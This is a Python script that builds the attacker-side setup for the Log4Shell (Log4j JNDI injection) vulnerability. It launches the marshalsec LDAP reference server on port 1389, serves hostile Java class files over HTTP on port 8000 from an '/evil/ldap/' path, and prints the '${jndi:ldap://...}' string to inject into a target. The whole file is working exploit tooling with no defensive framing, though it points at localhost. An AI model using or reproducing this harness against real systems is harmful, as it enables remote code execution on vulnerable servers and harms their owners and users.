#!/usr/bin/env python3

import os
import subprocess
import sys
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
from pathlib import Path


def start_ldap_server(web_server_address: str, web_server_port: int, java_class_to_load) -> None:
    print(f"[INFO] Call me with: ${{jndi:ldap://{web_server_address}:1389/anyString}}\n")

    url = f"http://{web_server_address}:{web_server_port}/evil/ldap/#{java_class_to_load}"
    current_folder = Path(__file__).parent.resolve()
    java_bin = 'java'
    java_home = os.environ.get('JAVA_HOME')
    if java_home:
        java_bin = os.path.join(java_home, 'bin', 'java')

    subprocess.run([
        java_bin,
        "--version",
    ])
    subprocess.run([
        java_bin,
        "-cp",
        os.path.join(current_folder, "marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        url,
    ])


def main() -> None:
    print("[INFO] Starting LDAP server on port 1389")

    web_server_address = "localhost"
    web_server_port = 8000
    java_class_to_load = sys.argv[1]

    # Create the LDAP server on new thread
    t1 = threading.Thread(target=start_ldap_server, args=(web_server_address, web_server_port, java_class_to_load))
    t1.start()

    # Start the web server which hosts the *.class files
    httpd = HTTPServer((web_server_address, web_server_port), SimpleHTTPRequestHandler)
    httpd.serve_forever()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
